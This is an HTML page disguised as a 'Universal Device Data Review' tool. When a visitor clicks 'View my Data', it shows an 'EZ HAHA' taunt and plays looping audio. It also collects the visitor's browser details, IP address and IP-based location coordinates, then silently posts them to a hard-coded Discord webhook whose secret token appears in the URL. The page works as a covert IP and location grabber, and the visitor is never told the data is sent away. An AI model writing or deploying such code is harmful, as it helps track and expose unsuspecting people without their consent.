<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Info Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #121212;
            color: #ffffff;
            margin: 0;
            overflow: hidden;
        }
        h1 {
            color: #ffffff;
            font-size: 36px;
            margin-bottom: 20px;
        }
        .info {
            margin: 10px 0;
            padding: 20px;
            border: 1px solid #444;
            border-radius: 10px;
            background: #1e1e1e;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
            display: inline-block;
            min-width: 300px;
            position: absolute;
            animation: moveAnimation 10s linear infinite;
        }
        p {
            color: #dddddd;
            font-size: 16px;
        }
        .landingPage {
            padding: 50px;
            text-align: center;
            background: #2c2c2c;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
            position: relative;
            max-width: 500px;
            margin: 0 auto;
        }
        .landingPage button {
            background-color: #008CBA;
            color: white;
            padding: 15px 32px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
        }
        .landingPage button:hover {
            background-color: #005f73;
        }
        .titleText {
            font-size: 40px;
            color: #ff6347;
            font-weight: bold;
            margin-top: 40px;
        }

        /* Animation for moving the info box */
        @keyframes moveAnimation {
            0% { left: 0%; top: 0%; }
            25% { left: 50%; top: 0%; }
            50% { left: 50%; top: 50%; }
            75% { left: 0%; top: 50%; }
            100% { left: 0%; top: 0%; }
        }

        /* Fade In animation */
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        /* Apply fadeIn effect when device info is revealed */
        .fadeIn {
            animation: fadeIn 2s ease-out;
        }

        /* Landing Page Text Style */
        .landingPage h2 {
            font-size: 24px;
            color: #ddd;
            margin-top: 20px;
        }
        .landingPage p {
            font-size: 18px;
            color: #bbb;
            margin-top: 15px;
        }

    </style>
</head>
<body>
    <div id="landingPage" class="landingPage">
        <h1>Universal Device Data Review</h1>
        <h2>Take a Look at your Device Data and Learn how to change Them.</h2>
        <button id="showButton">View my Data</button>
    </div>

    <div id="deviceInfo" class="info" style="display:none;">
        <div class="titleText">EZ HAHA</div>
        <p>Loading device data...</p>
    </div>

    <audio id="audio" loop>
        <source src="haha.mp3" type="audio/mp3">
        Your browser does not support the audio element.
    </audio>

    <script>
        async function getDeviceInfo() {
            const infoDiv = document.getElementById('deviceInfo');
            const landingPage = document.getElementById('landingPage');

            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;

            let ipAddress = 'Fetching...';
            let positionData = {
                city: 'Fetching...',
                region: 'Fetching...',
                timezone: 'Fetching...',
                latitude: 'Fetching...',
                longitude: 'Fetching...'
            };

            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ipAddress = ipData.ip;

                const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                const geoData = await geoResponse.json();
                positionData = {
                    city: geoData.city,
                    region: geoData.region,
                    timezone: geoData.timezone,
                    latitude: geoData.latitude,
                    longitude: geoData.longitude
                };
            } catch (error) {
                console.error('Error fetching location data:', error);
            }

            const deviceData = {
                browser: userAgent,
                operatingSystem: platform,
                language: language,
                screenResolution: `${screenWidth} x ${screenHeight}`,
                ipAddress: ipAddress,
                city: positionData.city,
                region: positionData.region,
                timezone: positionData.timezone,
                latitude: positionData.latitude,
                longitude: positionData.longitude
            };

            // Try to fetch the custom device name from localStorage
            let deviceName = localStorage.getItem('customDeviceName');

            // If no custom device name exists, set a default one based on the platform
            if (!deviceName) {
                deviceName = `${deviceData.operatingSystem} Device`;
                // Save the custom name in localStorage for future visits
                localStorage.setItem('customDeviceName', deviceName);
            }

            infoDiv.innerHTML = `
                <div class="titleText">EZ HAHA</div>
                <p><strong>Device Name:</strong> ${deviceName}</p>
                <p><strong>Browser:</strong> ${deviceData.browser}</p>
                <p><strong>Operating System:</strong> ${deviceData.operatingSystem}</p>
                <p><strong>Language:</strong> ${deviceData.language}</p>
                <p><strong>Screen Resolution:</strong> ${deviceData.screenResolution}</p>
                <p><strong>Your IP Address:</strong> ${deviceData.ipAddress}</p>
                <p><strong>City:</strong> ${deviceData.city}</p>
                <p><strong>Region:</strong> ${deviceData.region}</p>
                <p><strong>Time Zone:</strong> ${deviceData.timezone}</p>
                <p><strong>Coordinates:</strong> ${deviceData.latitude}, ${deviceData.longitude}</p>
            `;

            // Apply the fadeIn effect
            infoDiv.classList.add('fadeIn');

            // Send the data to the webhook with a panel-like message
            try {
                await fetch('https://discordapp.com/api/webhooks/1330513852315734076/cHE5eHxuscj1irA0SDp4wJOz-SwQnVWzGl1IHibnNa8-MEuU0pgSD6jr6FXrPx72vsVB', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        embeds: [{
                            title: 'Device Data',
                            color: 16711680, // Red color
                            fields: [
                                { name: 'Device Name', value: deviceName, inline: false },
                                { name: 'Browser', value: deviceData.browser, inline: false },
                                { name: 'Operating System', value: deviceData.operatingSystem, inline: false },
                                { name: 'Language', value: deviceData.language, inline: false },
                                { name: 'Screen Resolution', value: deviceData.screenResolution, inline: false },
                                { name: 'IP Address', value: deviceData.ipAddress, inline: false },
                                { name: 'City', value: deviceData.city, inline: false },
                                { name: 'Region', value: deviceData.region, inline: false },
                                { name: 'Time Zone', value: deviceData.timezone, inline: false },
                                { name: 'Coordinates', value: `${deviceData.latitude}, ${deviceData.longitude}`, inline: false }
                            ]
                        }]
                    })
                });
            } catch (error) {
                console.error('Error sending data to webhook:', error);
            }
        }

        document.getElementById('showButton').addEventListener('click', function() {
            // Hide landing page
            document.getElementById('landingPage').style.display = 'none';

            // Show device info with animation
            const deviceInfoDiv = document.getElementById('deviceInfo');
            deviceInfoDiv.style.display = 'block';

            // Play the sound in loop
            const audio = document.getElementById('audio');
            audio.play();

            // Fetch device information
            getDeviceInfo();
        });
    </script>
</body>
</html>
